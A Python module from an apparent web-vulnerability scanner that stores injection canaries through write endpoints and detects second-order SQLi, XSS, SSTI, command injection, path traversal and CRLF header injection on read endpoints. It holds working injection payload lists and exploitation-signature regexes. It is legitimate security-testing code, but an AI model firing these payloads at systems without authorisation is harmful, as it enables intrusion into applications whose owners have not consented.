"""
DS1 Hunter - Second-Order Injection Detection
DigitalSecurity1 - "Hunt. Chain. Prove."

Second-order (stored) injection: a payload is stored during one request
and executed when retrieved by a different request.

Unlike first-order injection where the payload fires immediately,
second-order requires a two-phase approach:
  Phase 1 - Store: inject a canary payload via a write endpoint
             (registration, profile update, comment, order note, etc.)
  Phase 2 - Trigger: request read endpoints that display stored data
             and look for the canary in the response

Attack classes covered:
  - Second-order SQLi     (canary causes DB error on read)
  - Second-order XSS      (canary executes in a different user's browser context)
  - Second-order CMDi     (canary reaches a system() call on retrieval)
  - Second-order Path Traversal (canary reaches a file path construction)
  - Second-order SSTI     (canary reaches a template engine on retrieval)
  - Second-order Header Injection (canary in stored value used in HTTP response)
"""

import asyncio
import logging
import re
import uuid
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse, urljoin

import aiohttp

logger = logging.getLogger("ds1hunter.second_order")


# ── Canary & payload templates ────────────────────────────────────────────────

def _sqli_canaries(uid: str) -> List[str]:
    return [
        f"ds1'{uid}--",
        f'ds1"{uid}--',
        f"ds1'{uid} OR '1'='1",
        f"ds1'{uid} AND 1=1--",
        f"ds1'{uid}; SELECT 1--",
        f"1' AND extractvalue(1,concat(0x7e,'{uid}'))--",
    ]


def _xss_canaries(uid: str) -> List[str]:
    return [
        f'<script>ds1_{uid}</script>',
        f'<img src=x onerror=ds1_{uid}>',
        f'"><script>ds1_{uid}</script>',
        f"'><img src=x onerror=ds1_{uid}>",
        f'{{{{ds1_{uid}}}}}',          # template injection canary too
        f'<svg onload=ds1_{uid}>',
    ]


def _ssti_canaries(uid: str) -> List[str]:
    return [
        f'${{7*7}}ds1_{uid}',
        f'{{{{7*7}}}}ds1_{uid}',
        f'#{{7*7}}ds1_{uid}',
        f'<%= 7*7 %>ds1_{uid}',
        f'*{{7*7}}ds1_{uid}',
    ]


def _cmdi_canaries(uid: str) -> List[str]:
    return [
        f';echo ds1_{uid}',
        f'`echo ds1_{uid}`',
        f'$(echo ds1_{uid})',
        f'| echo ds1_{uid}',
        f'& echo ds1_{uid}',
    ]


def _traversal_canaries(uid: str) -> List[str]:
    return [
        f'../../../tmp/ds1_{uid}',
        f'..%2F..%2Ftmp%2Fds1_{uid}',
        f'....//....//tmp/ds1_{uid}',
    ]


def _header_canaries(uid: str) -> List[str]:
    return [
        f'ds1_{uid}\r\nX-Injected: true',
        f'ds1_{uid}\nX-Injected: true',
        f'ds1_{uid}%0d%0aX-Injected: true',
    ]


# ── Response matchers ─────────────────────────────────────────────────────────

_SQLI_ERROR = re.compile(
    r'sql.*syntax|mysql.*error|ORA-\d{5}|pg_query|'
    r'sqlite.*error|SQLSTATE|unclosed quotation|'
    r'Column.*not found|Table.*doesn.*exist|'
    r'you have an error in your sql',
    re.I,
)

_XSS_EXEC   = re.compile(r'<script>|onerror=|onload=|<svg', re.I)
_SSTI_EXEC  = re.compile(r'\b49\b|\b7777777\b|FREEMARKER|Runtime@', re.I)
_CMDI_EXEC  = re.compile(r'uid=\d+\(.+\)|root:x:0:0|Volume Serial Number', re.I)
_HDR_INJECT = re.compile(r'X-Injected:\s*true', re.I)


class SecondOrderScanner:
    """
    Two-phase second-order injection scanner.

    Usage:
        scanner = SecondOrderScanner(target, session_id, auth_headers)
        # Provide write endpoints (where data is stored)
        # and read endpoints (where stored data is displayed)
        findings = await scanner.scan(write_endpoints, read_endpoints)
    """

    def __init__(
        self,
        target: str,
        session_id: str,
        auth_headers: Optional[Dict[str, str]] = None,
    ):
        self.target       = target.rstrip('/')
        self.session_id   = session_id
        self.auth_headers = auth_headers or {}
        self.findings: List[Dict[str, Any]] = []
        self._stored_canaries: Dict[str, Tuple[str, str, str]] = {}

    async def scan(
        self,
        write_endpoints: List[Dict],
        read_endpoints: List[str],
        connector: Optional[aiohttp.BaseConnector] = None,
    ) -> List[Dict[str, Any]]:
        """
        write_endpoints: list of {url, method, params} dicts
        read_endpoints: list of URLs to check after storage
        """
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(
            connector=connector or aiohttp.TCPConnector(ssl=False),
            headers=self.auth_headers,
            timeout=timeout,
        ) as session:
            # Phase 1: store canaries across all write endpoints
            await self._phase1_store(session, write_endpoints)

            # Small delay to allow async writes to commit
            await asyncio.sleep(0.5)

            # Phase 2: trigger and detect across all read endpoints
            await self._phase2_trigger(session, read_endpoints)

        return self.findings

    async def _phase1_store(
        self,
        session: aiohttp.ClientSession,
        write_endpoints: List[Dict],
    ) -> None:
        for ep in write_endpoints:
            url    = ep.get('url', '')
            method = ep.get('method', 'POST').upper()
            params = ep.get('params', {})

            if not url:
                continue
            if not url.startswith('http'):
                url = f'{self.target}{url}'

            uid = uuid.uuid4().hex[:10]
            for attack_type, canary_fn in [
                ('sqli',      _sqli_canaries),
                ('xss',       _xss_canaries),
                ('ssti',      _ssti_canaries),
                ('cmdi',      _cmdi_canaries),
                ('traversal', _traversal_canaries),
                ('header',    _header_canaries),
            ]:
                canaries = canary_fn(uid)
                for canary in canaries[:2]:  # store top 2 canaries per type
                    payload_params = {k: canary for k in params}
                    if not payload_params:
                        # no params specified - try common field names
                        for field in ('username', 'name', 'email', 'bio',
                                      'comment', 'description', 'title', 'address', 'note'):
                            payload_params[field] = canary

                    try:
                        if method == 'GET':
                            async with session.get(url, params=payload_params) as r:
                                await r.read()
                        else:
                            async with session.post(url, data=payload_params) as r:
                                await r.read()
                        canary_key = f'{attack_type}:{uid}:{canary}'
                        self._stored_canaries[canary_key] = (attack_type, url, canary)
                        logger.debug("[SecondOrder] Stored %s canary at %s", attack_type, url)
                    except Exception as e:
                        logger.debug("[SecondOrder] Store error %s: %s", url, e)

    async def _phase2_trigger(
        self,
        session: aiohttp.ClientSession,
        read_endpoints: List[str],
    ) -> None:
        for read_url in read_endpoints:
            if not read_url.startswith('http'):
                read_url = f'{self.target}{read_url}'

            try:
                async with session.get(read_url, allow_redirects=True) as resp:
                    body    = await resp.text(errors='replace')
                    headers = dict(resp.headers)
                    self._analyze_response(read_url, resp.status, body, headers)
            except Exception as e:
                logger.debug("[SecondOrder] Read error %s: %s", read_url, e)

    def _analyze_response(
        self,
        read_url: str,
        status: int,
        body: str,
        headers: Dict[str, str],
    ) -> None:
        for key, (attack_type, store_url, canary) in self._stored_canaries.items():
            # Check if canary is reflected in the response
            if canary in body or canary in str(headers):
                self._record_finding(
                    attack_type, store_url, read_url, canary, body, 'Canary reflected in response'
                )
                continue

            # Check for exploitation signs regardless of canary (may be stripped)
            uid = key.split(':')[1]
            if attack_type == 'sqli' and _SQLI_ERROR.search(body):
                self._record_finding(
                    'sqli', store_url, read_url, canary, body, 'SQL error in response after storage'
                )
            elif attack_type == 'xss' and uid in body and _XSS_EXEC.search(body):
                self._record_finding(
                    'xss', store_url, read_url, canary, body, 'XSS payload executed in response'
                )
            elif attack_type == 'ssti' and _SSTI_EXEC.search(body):
                self._record_finding(
                    'ssti', store_url, read_url, canary, body, 'Template expression evaluated in response'
                )
            elif attack_type == 'cmdi' and _CMDI_EXEC.search(body):
                self._record_finding(
                    'cmdi', store_url, read_url, canary, body, 'Command output in response after storage'
                )
            elif attack_type == 'header' and _HDR_INJECT.search(str(headers)):
                self._record_finding(
                    'header', store_url, read_url, canary, body,
                    'Injected HTTP header present in response'
                )

    def _record_finding(
        self,
        attack_type: str,
        store_url: str,
        read_url: str,
        canary: str,
        response_excerpt: str,
        detail_note: str,
    ) -> None:
        # Deduplicate
        key = f'{attack_type}:{store_url}:{read_url}'
        if any(
            f.get('evidence', {}).get('dedup_key') == key
            for f in self.findings
        ):
            return

        type_map = {
            'sqli':      ('Second-Order SQL Injection', 'critical'),
            'xss':       ('Second-Order XSS (Stored)',  'high'),
            'ssti':      ('Second-Order SSTI',           'critical'),
            'cmdi':      ('Second-Order Command Injection', 'critical'),
            'traversal': ('Second-Order Path Traversal', 'high'),
            'header':    ('Second-Order Header Injection', 'medium'),
        }
        title, severity = type_map.get(attack_type, (f'Second-Order {attack_type}', 'high'))

        self.findings.append({
            'type':      f'second_order_{attack_type}',
            'title':     title,
            'severity':  severity,
            'endpoint':  read_url,
            'evidence': {
                'store_endpoint':    store_url,
                'read_endpoint':     read_url,
                'stored_payload':    canary,
                'response_excerpt':  response_excerpt[:500],
                'detail_note':       detail_note,
                'dedup_key':         key,
            },
            'confirmed': True,
            'detail': (
                f'A {attack_type.upper()} payload was stored via {store_url} '
                f'and triggered when {read_url} was accessed. '
                f'{detail_note}. '
                'Second-order injections are frequently missed because the injection point '
                'and execution point are different requests.'
            ),
            'remediation': (
                'Sanitise stored data at retrieval time, not only at storage time. '
                'Apply parameterised queries/templates consistently on all data '
                'regardless of its origin. Treat database-resident data as untrusted input.'
            ),
            'poc': (
                f'# Phase 1 - Store\ncurl -X POST {store_url} --data "{canary}"\n\n'
                f'# Phase 2 - Trigger\ncurl {read_url}'
            ),
        })
        logger.warning("[SecondOrder] FOUND %s: store=%s read=%s", title, store_url, read_url)
